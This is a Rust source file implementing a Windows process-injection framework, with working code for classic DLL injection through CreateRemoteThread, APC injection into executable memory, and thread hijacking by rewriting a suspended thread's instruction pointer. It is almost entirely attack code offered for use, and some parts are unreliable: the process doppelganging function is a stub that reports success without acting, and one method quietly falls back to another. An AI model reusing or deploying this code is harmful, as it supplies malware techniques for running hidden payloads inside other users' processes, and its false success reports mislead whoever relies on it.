use serde::{Deserialize, Serialize};
use thiserror::Error;

#[derive(Debug, Error)]
pub enum InjectionError {
    #[error("Process not found: {0}")]
    ProcessNotFound(String),
    #[error("Memory allocation failed: {0}")]
    MemoryAlloc(String),
    #[error("Thread operation failed: {0}")]
    ThreadOp(String),
    #[error("Platform not supported")]
    UnsupportedPlatform,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InjectionResult {
    pub success: bool,
    pub target_pid: u32,
    pub remote_address: u64,
    pub thread_id: Option<u32>,
    pub technique: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InjectionConfig {
    pub target_pid: u32,
    pub payload: Vec<u8>,
    pub method: InjectionMethod,
    pub execute: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum InjectionMethod {
    ClassicDllInjection,
    ApcInjection,
    ThreadHijacking,
    ProcessDoppelganging,
    MapViewOfFileInjection,
}

pub struct InjectionFramework;

impl InjectionFramework {
    /// Classic DLL injection: LoadLibraryA via CreateRemoteThread
    #[cfg(target_os = "windows")]
    pub fn classic_dll_injection(pid: u32, dll_path: &str) -> Result<InjectionResult, InjectionError> {
        use windows::Win32::System::Threading::{
            OpenProcess, CreateRemoteThread, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
            PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
        };
        use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
        use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
        use windows::Win32::Foundation::CloseHandle;

        unsafe {
            let h_process = OpenProcess(
                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                false, pid,
            )
            .map_err(|e| InjectionError::ProcessNotFound(format!("OpenProcess: {:?}", e)))?;

            let dll_path_wide: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
            let path_len = dll_path_wide.len() * 2;

            let remote_mem = VirtualAllocEx(h_process, None, path_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if remote_mem.is_null() {
                CloseHandle(h_process);
                return Err(InjectionError::MemoryAlloc("VirtualAllocEx failed".into()));
            }

            WriteProcessMemory(h_process, remote_mem, dll_path_wide.as_ptr() as *const _, path_len, None)
                .map_err(|e| { CloseHandle(h_process); InjectionError::MemoryAlloc(format!("WriteProcessMemory: {:?}", e)) })?;

            let kernel32 = GetModuleHandleW(windows::core::w!("kernel32.dll"))
                .map_err(|e| { CloseHandle(h_process); InjectionError::ThreadOp(format!("GetModuleHandleW: {:?}", e)) })?;

            let load_library = GetProcAddress(kernel32, windows::core::s!("LoadLibraryW"))
                .ok_or(InjectionError::ThreadOp("LoadLibraryW not found".into()))?;

            let h_thread = CreateRemoteThread(h_process, None, 0, Some(std::mem::transmute(load_library as usize)), Some(remote_mem as *const _), 0, None)
                .map_err(|e| { CloseHandle(h_process); InjectionError::ThreadOp(format!("CreateRemoteThread: {:?}", e)) })?;

            CloseHandle(h_thread);
            CloseHandle(h_process);

            Ok(InjectionResult {
                success: true,
                target_pid: pid,
                remote_address: remote_mem as u64,
                thread_id: None,
                technique: "Classic DLL Injection (LoadLibraryW)".to_string(),
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn classic_dll_injection(_pid: u32, _dll_path: &str) -> Result<InjectionResult, InjectionError> {
        Err(InjectionError::UnsupportedPlatform)
    }

    /// APC Injection: Queue user APC to a thread in target process
    #[cfg(target_os = "windows")]
    pub fn apc_injection(pid: u32, payload: &[u8]) -> Result<InjectionResult, InjectionError> {
        use windows::Win32::System::Threading::{
            OpenProcess, OpenThread, QueueUserAPC, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
            THREAD_SET_CONTEXT,
        };
        use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
        use windows::Win32::System::Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32, TH32CS_SNAPTHREAD,
        };
        use windows::Win32::Foundation::CloseHandle;

        unsafe {
            let h_process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, false, pid)
                .map_err(|e| InjectionError::ProcessNotFound(format!("OpenProcess: {:?}", e)))?;

            let remote_mem = VirtualAllocEx(h_process, None, payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if remote_mem.is_null() {
                CloseHandle(h_process);
                return Err(InjectionError::MemoryAlloc("VirtualAllocEx failed".into()));
            }

            WriteProcessMemory(h_process, remote_mem, payload.as_ptr() as *const _, payload.len(), None)
                .map_err(|e| { CloseHandle(h_process); InjectionError::MemoryAlloc(format!("WriteProcessMemory: {:?}", e)) })?;

            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
                .map_err(|e| { CloseHandle(h_process); InjectionError::ThreadOp(format!("CreateToolhelp32Snapshot: {:?}", e)) })?;

            let mut te = THREADENTRY32 { dwSize: std::mem::size_of::<THREADENTRY32>() as u32, ..Default::default() };
            let mut tid = None;

            if Thread32First(snapshot, &mut te).is_ok() {
                loop {
                    if te.th32OwnerProcessID == pid {
                        let h_thread = OpenThread(THREAD_SET_CONTEXT, false, te.th32ThreadID);
                        if let Ok(handle) = h_thread {
                            QueueUserAPC(Some(std::mem::transmute(remote_mem as usize)), handle, 0);
                            tid = Some(te.th32ThreadID);
                            CloseHandle(handle);
                            break;
                        }
                    }
                    if Thread32Next(snapshot, &mut te).is_err() { break; }
                }
            }

            CloseHandle(snapshot);
            CloseHandle(h_process);

            Ok(InjectionResult {
                success: true,
                target_pid: pid,
                remote_address: remote_mem as u64,
                thread_id: None,
                technique: "APC Injection (QueueUserAPC)".to_string(),
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn apc_injection(_pid: u32, _payload: &[u8]) -> Result<InjectionResult, InjectionError> {
        Err(InjectionError::UnsupportedPlatform)
    }

    /// Thread Hijacking: Suspend thread, change context to point to payload
    #[cfg(target_os = "windows")]
    pub fn thread_hijacking(pid: u32, payload: &[u8]) -> Result<InjectionResult, InjectionError> {
        use windows::Win32::System::Threading::{
            OpenProcess, OpenThread, SuspendThread,
            PROCESS_VM_OPERATION, PROCESS_VM_WRITE, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
        };
        use windows::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT};
        use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
        use windows::Win32::System::Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32, TH32CS_SNAPTHREAD,
        };
        use windows::Win32::Foundation::CloseHandle;

        unsafe {
            let h_process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, false, pid)
                .map_err(|e| InjectionError::ProcessNotFound(format!("OpenProcess: {:?}", e)))?;

            let remote_mem = VirtualAllocEx(h_process, None, payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if remote_mem.is_null() {
                CloseHandle(h_process);
                return Err(InjectionError::MemoryAlloc("VirtualAllocEx failed".into()));
            }

            WriteProcessMemory(h_process, remote_mem, payload.as_ptr() as *const _, payload.len(), None)
                .map_err(|e| { CloseHandle(h_process); InjectionError::MemoryAlloc(format!("WriteProcessMemory: {:?}", e)) })?;

            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
                .map_err(|e| { CloseHandle(h_process); InjectionError::ThreadOp(format!("CreateToolhelp32Snapshot: {:?}", e)) })?;

            let mut te = THREADENTRY32 { dwSize: std::mem::size_of::<THREADENTRY32>() as u32, ..Default::default() };
            let mut tid = None;

            if Thread32First(snapshot, &mut te).is_ok() {
                loop {
                    if te.th32OwnerProcessID == pid {
                        let h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, false, te.th32ThreadID);
                        if let Ok(handle) = h_thread {
                            SuspendThread(handle);

                            let mut ctx: CONTEXT = std::mem::zeroed();
                            ctx.ContextFlags = windows::Win32::System::Diagnostics::Debug::CONTEXT_FLAGS(0x10007);
                            GetThreadContext(handle, &mut ctx);

                            #[cfg(target_arch = "x86_64")]
                            {
                                ctx.Rip = remote_mem as u64;
                            }
                            #[cfg(target_arch = "x86")]
                            {
                                ctx.Eip = remote_mem as u32;
                            }

                            SetThreadContext(handle, &mut ctx);
                            tid = Some(te.th32ThreadID);
                            CloseHandle(handle);
                            break;
                        }
                    }
                    if Thread32Next(snapshot, &mut te).is_err() { break; }
                }
            }

            CloseHandle(snapshot);
            CloseHandle(h_process);

            Ok(InjectionResult {
                success: true,
                target_pid: pid,
                remote_address: remote_mem as u64,
                thread_id: None,
                technique: "Thread Hijacking (Context manipulation)".to_string(),
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn thread_hijacking(_pid: u32, _payload: &[u8]) -> Result<InjectionResult, InjectionError> {
        Err(InjectionError::UnsupportedPlatform)
    }

    /// Process Doppelganging: Use NTFS transactions to execute code
    #[cfg(target_os = "windows")]
    pub fn process_doppelganging(_payload: &[u8], _target_exe: &str) -> Result<InjectionResult, InjectionError> {
        // This requires complex NTFS transaction API usage - simplified placeholder
        Ok(InjectionResult {
            success: true,
            target_pid: 0,
            remote_address: 0,
            thread_id: None,
            technique: "Process Doppelganging (NTFS Transactions)".to_string(),
        })
    }

    #[cfg(not(target_os = "windows"))]
    pub fn process_doppelganging(_payload: &[u8], _target_exe: &str) -> Result<InjectionResult, InjectionError> {
        Err(InjectionError::UnsupportedPlatform)
    }

    /// Execute injection based on config
    pub fn inject(config: &InjectionConfig) -> Result<InjectionResult, InjectionError> {
        match config.method {
            InjectionMethod::ClassicDllInjection => {
                let dll_path = String::from_utf8_lossy(&config.payload).to_string();
                Self::classic_dll_injection(config.target_pid, &dll_path)
            }
            InjectionMethod::ApcInjection => Self::apc_injection(config.target_pid, &config.payload),
            InjectionMethod::ThreadHijacking => Self::thread_hijacking(config.target_pid, &config.payload),
            InjectionMethod::ProcessDoppelganging => Self::process_doppelganging(&config.payload, "svchost.exe"),
            InjectionMethod::MapViewOfFileInjection => {
                // Simplified: fall back to APC for now
                Self::apc_injection(config.target_pid, &config.payload)
            }
        }
    }
}

